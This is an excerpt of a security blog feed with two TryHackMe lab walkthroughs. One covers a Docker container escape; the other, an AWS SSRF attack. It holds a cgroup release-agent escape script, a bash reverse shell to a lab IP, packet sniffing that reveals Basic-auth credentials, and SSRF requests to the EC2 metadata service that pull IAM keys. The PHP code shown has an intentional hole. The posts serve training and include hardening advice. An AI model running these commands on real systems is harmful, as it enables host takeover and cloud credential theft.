&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;cat /home/cmnatic/flag.txt &amp;gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$host_path&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;/flag.txt&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; /exploit
&lt;span class=&quot;nb&quot;&gt;chmod &lt;/span&gt;a+x /exploit
sh &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;echo &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\$\$&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; &amp;gt; /tmp/cgrp/x/cgroup.procs&quot;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;em&gt;Note: You can also try &lt;a href=&quot;https://blog.ajxchapman.com/posts/2020/11/19/privileged-container-escape.html&quot;&gt;Alex Chapman’s release-agent exploit&lt;/a&gt;, an alternative which uses PID brute-forcing in cases where you can’t access the underlying filesystem.&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;This is a blind attack, which means we won’t get any explicit feedback. If successful it would execute the script at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/exploit&lt;/code&gt;. In this case, it will copy the contents of a file (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;flag.txt&lt;/code&gt;) from a user’s home folder on the host system to a target location in the container.&lt;/p&gt;

&lt;p&gt;However, the biggest flaw in the release agent model is that an attacker can author it to perform arbitrary commands. Instead of exfiltration, this could remove or encrypt (ransomware) sensitive files on the host. It could also be used to transfer files to the host, such as the attacker’s SSH keys.&lt;/p&gt;

&lt;p&gt;Finally, if cgroup v1 is your &lt;em&gt;only&lt;/em&gt; attack vector for escaping the container, you could abuse it to launch a reverse shell, which provides a direct connection to the host:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;mkdir&lt;/span&gt; /tmp/cgrp &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; mount &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; cgroup &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; rdma cgroup /tmp/cgrp &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;mkdir&lt;/span&gt; /tmp/cgrp/x
&lt;span class=&quot;nb&quot;&gt;echo &lt;/span&gt;1 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; /tmp/cgrp/x/notify_on_release
&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;#!/bin/sh&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; /exploit
&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;bash -c &apos;bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.16.12/4242 0&amp;gt;&amp;amp;1&apos;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; /exploit
&lt;span class=&quot;nb&quot;&gt;chmod &lt;/span&gt;a+x /exploit
sh &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;echo &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\$\$&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; &amp;gt; /tmp/cgrp/x/cgroup.procs&quot;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;If you were trying to recreate this lab in your own VM, you would likely want an environment that supported this hybrid, so you could achieve the release-agent exploit. Of course, newer Linux distros have moved away from v1 entirely, and therefore no longer support cgroups release agents. If this were Ubuntu 21.10 or higher, that exploit would fail.&lt;/p&gt;

&lt;p&gt;In any case, all things taken into consideration, we can lay out a rough workflow for this system:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/2024-09-04/docker-architecture-flow.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This does, in fact, resemble the “orchestrator” architecture noted earlier. In this implementation, note the circular relationship between the Docker Daemon and the “control (privileged) container.” Recall that the container has mounted the Docker socket, so it can use the host’s daemon as it needs.&lt;/p&gt;

&lt;p&gt;Realistically, the goal here is orchestration. However, the design leaves room for excessive abuse of the entire system. To recap the steps taken, consider the general attack flow we took, which looked something like this:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/2024-09-04/docker-attack-flow.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Note that most of the exploitation was made easy because of the exposed TCP daemon, which provided unrestricted control over the Docker and host systems alike.&lt;/p&gt;

&lt;h1 id=&quot;exploitation&quot;&gt;Exploitation&lt;/h1&gt;

&lt;p&gt;The TryHackMe room notes four vulnerabilities:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Exploiting cgroup v1&lt;/li&gt;
  &lt;li&gt;Mounting the root filesystem to a new container&lt;/li&gt;
  &lt;li&gt;RCE via an exposed Daemon over TCP&lt;/li&gt;
  &lt;li&gt;Exploiting namespaces (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nsenter&lt;/code&gt;)&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;In our exploration of the system, we leveraged the exposed TCP daemon as well as ways to break out of the container (by &lt;em&gt;chroot&lt;/em&gt;-ing into a container on the host filesystem, or by using &lt;em&gt;nsenter&lt;/em&gt; from the privileged container). The cgroup exploit is an interesting blind attack, and you could certainly pull it off on an older system. However, as more production environments migrate and upgrade, this attack will become less applicable in time.&lt;/p&gt;

&lt;p&gt;Let’s revisit the “Important Context” from the TryHackMe site:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;This room focuses on exploiting the Docker daemon itself, which often, relies on having elevated permissions within the container… this room assumes that you have already managed to become root in the container.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;In retrospect, this “context” is interesting. One one hand, it’s easy to appreciate the assertion here, as the privileged container was one valid attack path. However, the bigger concern was, as noted, the daemon exposed over the TCP socket. This allowed us to tamper with the privileged container, to spawn new containers, and so forth.&lt;/p&gt;

&lt;p&gt;Perhaps, the authors had originally intended for Docker &lt;em&gt;not&lt;/em&gt; to be exposed via its TCP socket. In that case, the privileged container becomes the bigger attack vector. Attacks against SSH or any other services running on that container become prime targets and the prerequisite to the campaign against the host machine.&lt;/p&gt;

&lt;p&gt;Another interesting constraint here is that a “privileged” container, in itself, is not necessarily susceptible to as brutal of attacks. In fact, the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;--privileged&lt;/code&gt; flag without other misconfigurations (using the host PID, mounting the Docker scoket, exposing the Docker daemon, etc.) could really only abuse the release-agent escape or the host-filesystem mount. This is still very abuseable, but will take more work compared to the environment we explored.&lt;/p&gt;

&lt;p&gt;Most of the tactics used here are also laid out in this &lt;a href=&quot;https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security/docker-breakout-privilege-escalation&quot;&gt;HackTricks cheat sheet&lt;/a&gt;. The difference is that, with an eye towards DevSecOps, we want to understand what the environment is and what it is supposed to do. That way, you can provide and plan  meaningful remediations that are relevant with respect to the system’s purpose.&lt;/p&gt;

&lt;h1 id=&quot;recommendations&quot;&gt;Recommendations&lt;/h1&gt;

&lt;p&gt;In general, acknowledge the following:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Disable cgroup v1 on systems that run Docker&lt;/li&gt;
  &lt;li&gt;Wherever possible, &lt;a href=&quot;https://docs.docker.com/engine/security/rootless/&quot;&gt;run Docker in “rootless mode”&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;If rootless mode is absolutely impossible for some reason, manage Docker by adding an unprivileged user, whose sole responsibility is to manage docker, to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;docker&lt;/code&gt; group&lt;/li&gt;
  &lt;li&gt;By default, use the most restrictive container permissions&lt;/li&gt;
  &lt;li&gt;Assign only the permissions that are absolutely needed&lt;/li&gt;
  &lt;li&gt;Avoid privileged containers&lt;/li&gt;
  &lt;li&gt;Prefer application APIs, which implements effective authentication and authorization, over directly exposing the Docker daemon&lt;/li&gt;
  &lt;li&gt;If the Docker daemon must be exposed, restrict access with key-based SSH or with TLS keys&lt;/li&gt;
  &lt;li&gt;Prefer a more robust container orchestration solution, such as Kubernetes, over a home-rolled solution&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Many of these recommendations are aligned with &lt;a href=&quot;https://cheatsheetseries.owasp.org/cheatsheets/Docker_Security_Cheat_Sheet.html&quot;&gt;OWASP guidance on container security&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;Without those two protections, we abused the daemon and got RCE pretty quickly, and then explored a few ways to do so. During an engagement, you should look for these attack vectors: on the host system, Docker configuration, and container application. This can help you make a case to upgrade or move away from a weak solution, and look towards one that is resilient in the face of classic attacks.&lt;/p&gt;

&lt;p&gt;The intended purpose of this system is still a bit of a mystery. The daemon over TCP, coupled with the privileged container, seems redundant, and sends an unclear message about its use cases. Each case could, on its own, serve the needs of container orchestration or CI/CD pipelines, albeit with its own caveats and security considerations; TCP via key-based TLS or SSH may be the better route.&lt;/p&gt;

&lt;p&gt;Or, they could use something else. &lt;em&gt;Anything&lt;/em&gt; else.&lt;/p&gt;

&lt;h1 id=&quot;post-script&quot;&gt;Post-script&lt;/h1&gt;

&lt;p&gt;Start the capture, generate some traffic on the host, and end the capture when you’re ready:&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@ubuntu:~# tcpdump -i enp0s5 -w capture.pcap
tcpdump: listening on enp0s5, link-type EN10MB (Ethernet), capture size 262144 bytes
^C100 packets captured
101 packets received by filter
0 packets dropped by kernel
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;You can then inspect the capture file for any interesting traffic made by the host, including sites, objects, and passwords. For example, snooping unencrypted HTTP traffic:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@ubuntu:~# tshark -r capture.pcap -O http -Y http
...
Frame 45: 130 bytes on wire (1040 bits), 130 bytes captured (1040 bits)
Ethernet II, Src: Parallel_ed:f6:f5 (00:1c:42:ed:f6:f5), Dst: Parallel_00:00:18 (00:1c:42:00:00:18)
Internet Protocol Version 4, Src: 10.211.55.18, Dst: 34.223.124.45
Transmission Control Protocol, Src Port: 34910, Dst Port: 80, Seq: 1, Ack: 1, Len: 76
Hypertext Transfer Protocol
    GET / HTTP/1.1\r\n
        [Expert Info (Chat/Sequence): GET / HTTP/1.1\r\n]
            [GET / HTTP/1.1\r\n]
            [Severity level: Chat]
            [Group: Sequence]
        Request Method: GET
        Request URI: /
        Request Version: HTTP/1.1
    Host: neverssl.com\r\n
    User-Agent: curl/7.68.0\r\n
    Accept: */*\r\n
    \r\n
    [Full request URI: http://neverssl.com/]
    [HTTP request 1/1]

Frame 51: 1419 bytes on wire (11352 bits), 1419 bytes captured (11352 bits)
Ethernet II, Src: Parallel_00:00:18 (00:1c:42:00:00:18), Dst: Parallel_ed:f6:f5 (00:1c:42:ed:f6:f5)
Internet Protocol Version 4, Src: 34.223.124.45, Dst: 10.211.55.18
Transmission Control Protocol, Src Port: 80, Dst Port: 34910, Seq: 2897, Ack: 77, Len: 1365
[3 Reassembled TCP Segments (4261 bytes): #47(1460), #48(1436), #51(1365)]
Hypertext Transfer Protocol
    HTTP/1.1 200 OK\r\n
        [Expert Info (Chat/Sequence): HTTP/1.1 200 OK\r\n]
            [HTTP/1.1 200 OK\r\n]
            [Severity level: Chat]
            [Group: Sequence]
        Response Version: HTTP/1.1
        Status Code: 200
        [Status Code Description: OK]
        Response Phrase: OK
    Date: Sat, 07 Sep 2024 10:44:59 GMT\r\n
    Server: Apache/2.4.58 ()\r\n
    Upgrade: h2,h2c\r\n
    Connection: Upgrade\r\n
    Last-Modified: Wed, 29 Jun 2022 00:23:33 GMT\r\n
    ETag: &quot;f79-5e28b29d38e93&quot;\r\n
    Accept-Ranges: bytes\r\n
    Content-Length: 3961\r\n
        [Content length: 3961]
    Vary: Accept-Encoding\r\n
    Content-Type: text/html; charset=UTF-8\r\n
    \r\n
    [HTTP response 1/1]
    [Time since request: 0.094416000 seconds]
    [Request in frame: 45]
    [Request URI: http://neverssl.com/]
    File Data: 3961 bytes
Line-based text data: text/html (131 lines)

Frame 77: 184 bytes on wire (1472 bits), 184 bytes captured (1472 bits)
Ethernet II, Src: Parallel_ed:f6:f5 (00:1c:42:ed:f6:f5), Dst: ca:89:f3:2d:4f:64 (ca:89:f3:2d:4f:64)
Internet Protocol Version 4, Src: 10.211.55.18, Dst: 10.211.55.2
Transmission Control Protocol, Src Port: 37572, Dst Port: 80, Seq: 1, Ack: 1, Len: 118
Hypertext Transfer Protocol
    GET / HTTP/1.1\r\n
        [Expert Info (Chat/Sequence): GET / HTTP/1.1\r\n]
            [GET / HTTP/1.1\r\n]
            [Severity level: Chat]
            [Group: Sequence]
        Request Method: GET
        Request URI: /
        Request Version: HTTP/1.1
    Host: 10.211.55.2\r\n
    Authorization: Basic YWRtaW46cGFzc3dvcmQ=\r\n
        Credentials: admin:password
    User-Agent: curl/7.68.0\r\n
    Accept: */*\r\n
    \r\n
    [Full request URI: http://10.211.55.2/]
    [HTTP request 1/1]

Frame 82: 95 bytes on wire (760 bits), 95 bytes captured (760 bits)
Ethernet II, Src: ca:89:f3:2d:4f:64 (ca:89:f3:2d:4f:64), Dst: Parallel_ed:f6:f5 (00:1c:42:ed:f6:f5)
Internet Protocol Version 4, Src: 10.211.55.2, Dst: 10.211.55.18
Transmission Control Protocol, Src Port: 80, Dst Port: 37572, Seq: 174, Ack: 119, Len: 29
[2 Reassembled TCP Segments (202 bytes): #80(173), #82(29)]
Hypertext Transfer Protocol
    HTTP/1.1 200 OK\r\n
        [Expert Info (Chat/Sequence): HTTP/1.1 200 OK\r\n]
            [HTTP/1.1 200 OK\r\n]
            [Severity level: Chat]
            [Group: Sequence]
        Response Version: HTTP/1.1
        Status Code: 200
        [Status Code Description: OK]
        Response Phrase: OK
    Server: Werkzeug/3.0.1 Python/3.11.9\r\n
    Date: Sat, 07 Sep 2024 10:45:02 GMT\r\n
    Content-Type: text/html; charset=utf-8\r\n
    Content-Length: 29\r\n
        [Content length: 29]
    Connection: close\r\n
    \r\n
    [HTTP response 1/1]
    [Time since request: 0.005050000 seconds]
    [Request in frame: 77]
    [Request URI: http://10.211.55.2/]
    File Data: 29 bytes
Line-based text data: text/html (1 lines)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name></name></author><summary type="html">This walkthrough will cover the “Docker Practical” from TryHackMe’s Container Security path. The environment is an insecure, goat-like deployment, meant for excessive hacking. You are unlikely to find something like this in the wild; but, in the rare case that you do, be aware of the attack vectors laid out here.</summary></entry><entry><title type="html">TryHackMe AWS EC2 Walkthrough</title><link href="http://localhost:4000/2024/02/18/thm-ec2-walkthrough.html" rel="alternate" type="text/html" title="TryHackMe AWS EC2 Walkthrough" /><published>2024-02-18T00:00:00-05:00</published><updated>2024-02-18T00:00:00-05:00</updated><id>http://localhost:4000/2024/02/18/thm-ec2-walkthrough</id><content type="html" xml:base="http://localhost:4000/2024/02/18/thm-ec2-walkthrough.html">&lt;h1 id=&quot;thm-ec2-capstone-walkthrough&quot;&gt;THM EC2 Capstone Walkthrough&lt;/h1&gt;

&lt;p&gt;As backdrop, the THM lab provides you with a set of long-term AWS keys (Access ID and Secret Key). We could speculate how these are retrieved in a real-world pentest: social engineering, successful phishing, or secrets leaking. Regardless, IAM credentials are the springboard for many successful AWS attacks, so the hard part is done.&lt;/p&gt;

&lt;p&gt;Next, we find out that, via threat intelligence, a Server-Side Request Forgery (SSRF) vulnerability exists in an EC2-hosted application, which is available via a public-facing load balancer. The SSRF vulnerability can give an attacker the opportunity to infiltrate a private subnet. All of this is within the same VPC, but the private subnet that hosts the internal EC2 instance is available to anyone within that VPC.&lt;/p&gt;

&lt;p&gt;Let’s start by enumerating all load balancers within our account:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;~$ aws elbv2 describe-load-balancers
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The &lt;em&gt;DNSName&lt;/em&gt; field will give us the public URL. Use &lt;em&gt;nslookup&lt;/em&gt; to get the IP and its host:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;~$ nslookup initial-ssrf-vector-1523602582.us-east-1.elb.amazonaws.com
...
Address: 174.129.20.233
...

~$ nslookup 174.129.20.233
...
Non-authoritative answer:
233.20.129.174.in-addr.arpa	name = ec2-174-129-20-233.compute-1.amazonaws.com.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The &lt;em&gt;ec2-&lt;/em&gt; in the second answer indicates that this is, in fact, an EC2 instance. Open it in a browser, or via &lt;em&gt;curl&lt;/em&gt;. Interestingly, the response payload is just the phrase, “Hello Nurse”.&lt;/p&gt;

&lt;p&gt;Although it’s not noted in the briefing, the THM walkthrough does provide a valid webpage: &lt;em&gt;/ssrf.php&lt;/em&gt;, which loads the vulnerable application component. The &lt;em&gt;IP&lt;/em&gt; text entry field requires, oddly, a web URI or URL. The application will make a request to that URI and display the response payload at the very top of the page.&lt;/p&gt;

&lt;p&gt;Enter a URL, like &lt;em&gt;google.com&lt;/em&gt;, and click &lt;strong&gt;Submit Query&lt;/strong&gt;. The response body appears at the top of the page. Note that if you forget to specify the &lt;em&gt;https://&lt;/em&gt; protocol, then a 301 message may display instead; this simply indicates an HTTP-to-HTTPS redirect and is trivial for this guide.&lt;/p&gt;

&lt;p&gt;Now, inspect the navigation bar for the current page. The URL you specified is in the query parameter, &lt;em&gt;r&lt;/em&gt;. If you specified &lt;em&gt;google.com&lt;/em&gt;, then the request URL is:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://initial-ssrf-vector-1523602582.us-east-1.elb.amazonaws.com/ssrf.php?r=google.com#
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Before going much farther, it’s worth taking a look at the source code for this feature, which is displayed in the &lt;em&gt;ssrf.php&lt;/em&gt; webpage:&lt;/p&gt;

&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;isset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;r&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;$ch&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;curl_init&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
        &lt;span class=&quot;nb&quot;&gt;curl_setopt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$ch&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;CURLOPT_URL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;r&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;
        &lt;span class=&quot;nb&quot;&gt;curl_setopt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$ch&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;CURLOPT_HEADER&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;nb&quot;&gt;curl_exec&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$ch&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;nb&quot;&gt;curl_close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$ch&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The source code snippet seems to indicate that the application is leveraging the &lt;a href=&quot;https://www.php.net/manual/en/book.curl.php&quot;&gt;PHP &lt;em&gt;curl&lt;/em&gt; library&lt;/a&gt; to make the request to your chosen URL. A few things to note here:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;The &lt;em&gt;curl&lt;/em&gt; logic is initiated so long as the query parameter &lt;em&gt;r&lt;/em&gt; exists.&lt;/li&gt;
  &lt;li&gt;The first &lt;em&gt;curl_setopt&lt;/em&gt; function call will unconditionally set whatever URL you sent. No input validation on the URL is performed.&lt;/li&gt;
  &lt;li&gt;The &lt;em&gt;curl_exec&lt;/em&gt; command will make the request to the unvalidated URL.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;There exists no logic to enforce an allowed list of IPs, URLs, domains, and so forth. So, the &lt;em&gt;curl&lt;/em&gt; invocation will request any URL you gave it, and return the logic as-is.&lt;/p&gt;

&lt;p&gt;Since we know this is within the same VPC as the internal EC2 instance, we can try to leverage the Instance Metadata Service (IMDS). This will allow us to make simple requests with a URL string and, depending on the configuration, retrieve information about the EC2 instance with which we are working. It’s worth noting that there are currently two versions: IMDSv2 (preferred) and IMDSv1 (legacy).&lt;/p&gt;

&lt;p&gt;Here are some key points from an attacker’s point of view:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;The IMDS, regardless of its version, is &lt;a href=&quot;https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html&quot;&gt;always located at 169.254.169.254&lt;/a&gt;.&lt;/li&gt;
  &lt;li&gt;Metadata for both versions can be retrieved from &lt;em&gt;169.254.169.254/latest/meta-data&lt;/em&gt;.&lt;/li&gt;
  &lt;li&gt;Both versions have &lt;a href=&quot;https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/instancedata-data-categories.html&quot;&gt;metadata categories&lt;/a&gt;, which represent access points to get key information, and are simply appended to the &lt;em&gt;/latest/meta-data&lt;/em&gt; path in the URL.&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/instancedata-data-retrieval.html#imds-considerations&quot;&gt;IMDSv2 requires the use of tokens for authorization&lt;/a&gt;, whereas IMDSv1 performs &lt;em&gt;no authorization checks&lt;/em&gt;.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;So, if we use the vulnerable &lt;em&gt;ssrf.php&lt;/em&gt; to make a request to an instance metadata endpoint, we should be able to get back some information about the instance itself. Send a request with the following URL path:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/ssrf.php?r=169.254.169.254/latest/meta-data
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;em&gt;Note: The full URL, with encoding, would look like so:&lt;/em&gt;&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://initial-ssrf-vector-1523602582.us-east-1.elb.amazonaws.com/ssrf.php?r=169.254.169.254%2Flatest%2Fmeta-data#
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The response displays at the top of the page:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ami-id
...
iam/
...
system
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Note that this list matches up with the metadata categories. The presence of the &lt;em&gt;iam/&lt;/em&gt; directory is interesting. Since we know that many AWS attacks begin by exploiting weaknesses or misconfigurations in this service, let’s try to push this.&lt;/p&gt;

&lt;p&gt;Open the documentation for all metadata categories and search for IAM ones. Note the &lt;em&gt;iam/security-credentials&lt;/em&gt; metadata category. The documentation notes that &lt;em&gt;role-name&lt;/em&gt; is optional, so the following two forms are valid:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;em&gt;iam/security-credentials&lt;/em&gt;&lt;/li&gt;
  &lt;li&gt;&lt;em&gt;iam/security-credentials/role-name&lt;/em&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;However, these two forms will retrieve different information. Here’s what the documentation says about this category:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;If there is an IAM role associated with the instance, role-name is the name of the role, and role-name contains the temporary security credentials associated with the role… Otherwise, (role-name is) not present.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;So, if we can get the role name, we can add the role name itself to the end of the path and effectively get temporary security credentials. This would allow us to impersonate the EC2 instance to some capacity. The question is: what &lt;em&gt;is&lt;/em&gt; the name of the role?&lt;/p&gt;

&lt;p&gt;Before going to far in, recall a couple of things:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;The &lt;em&gt;/latest/meta-data&lt;/em&gt; path listed files and directories.&lt;/li&gt;
  &lt;li&gt;The &lt;em&gt;iam/security-credentials&lt;/em&gt; path is valid, even if it proves useless.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;So… what happens if we just target &lt;em&gt;/latest/meta-data/iam/security-credentials&lt;/em&gt;, like so:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/ssrf.php?r=169.254.169.254/latest/meta-data/iam/security-credentials
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Send this request. As it turns out, we get a bit of information:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;StarStarWAFRole
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We can test if this is a valid role name by using this in the form, &lt;em&gt;iam/security-credentials/StarStarWAFRole&lt;/em&gt;:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/ssrf.php?r=169.254.169.254/latest/meta-data/iam/security-credentials/StarStarWAFRole
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;This does, in fact, return temporary credentials:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;{
  &quot;Code&quot; : &quot;Success&quot;,
  &quot;LastUpdated&quot; : &quot;2024-01-21T02:42:34Z&quot;,
  &quot;Type&quot; : &quot;AWS-HMAC&quot;,
  &quot;AccessKeyId&quot; : &quot;ASIA...&quot;,
  &quot;SecretAccessKey&quot; : &quot;...&quot;,
  &quot;Token&quot; : &quot;...&quot;,
